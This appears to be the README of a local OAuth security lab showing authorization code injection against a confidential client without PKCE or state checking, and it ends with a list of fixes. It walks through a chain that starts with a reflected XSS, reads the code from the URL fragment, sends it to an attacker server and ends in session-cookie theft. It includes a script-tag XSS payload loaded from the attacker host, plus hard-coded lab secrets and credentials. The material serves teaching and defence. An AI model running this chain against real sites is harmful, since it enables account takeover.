# Scenario 2 — Confidential client, code flow, no PKCE

Based on <https://security.lauritz-holtmann.de/post/xss-ato-gadgets/> (gadget 2).

## Idea

A "safe" server-side app: **confidential** client, code flow, the client
secret never leaves the backend. No implicit flow. But:

* the client does **not** use PKCE, and
* the RP does **not** bind `state` to the browser session (it generates a
  `state` and then never checks it in `/callback`).

An XSS in the RP origin runs a silent code request forced into the fragment:

```
open  https://IdP/auth?client_id=s2-confidential
                       &response_type=code
                       &response_mode=fragment      <-- code lands in #, RP server never sees it
                       &redirect_uri=http://127.0.0.1:8102/callback
                       &prompt=none
```

The injected script reads `location.hash` → the victim's authorization
`code`, and sends it to the attacker.

**Authorization code injection:** the attacker now feeds that code to the
RP's own `/callback`. Because there is no PKCE and no `state` binding, the RP
backend happily redeems it with its client secret, creates a session, and
returns `Set-Cookie: sid=…` for the **victim**. The attacker captured a
logged-in session without ever seeing the secret or a token.

## Layout

| file | port | role |
|------|------|------|
| `main.go`         | 8102 | victim RP: confidential client, no PKCE, no state check; reflected-XSS `/search` |
| `attacker/main.go`| 9102 | hosts payload, receives code, injects it into `/callback`, steals the session cookie |

Client secret is hard-coded on both sides for the lab:
`s2-confidential-secret-0000` (from `../keycloak/realm-export.json`).

## Run

```sh
cd s2-confidential-no-pkce
go run .            # RP        -> http://127.0.0.1:8102
go run ./attacker   # attacker  -> http://127.0.0.1:9102
```

1. Sign in once at <http://127.0.0.1:8102/login> as `victim` / `victim`.
   (Login fails with "Invalid username or password"? Run `bash ../keycloak/setup.sh`.)
2. Open <http://127.0.0.1:8102/lab> and follow the reflected-XSS link: <script src=http://127.0.0.1:9102/payload.js></script>.
3. Attacker console / <http://127.0.0.1:9102/loot> shows the stolen `sid`
   cookie and `/api/me` returning `logged in as: victim`.

## Fix

* Use PKCE even for confidential clients.
* Bind `state` (and `nonce`) to the browser session and verify it in the
  callback; reject codes that arrive for an unknown `state`.
* Never let an authorization `code` reach a URL fragment / third-party JS —
  keep `response_mode=query` and redeem server-side in the same request.
* `X-Frame-Options` / `frame-ancestors 'none'` + CSP + output encoding stop
  the XSS/framing that starts the chain.
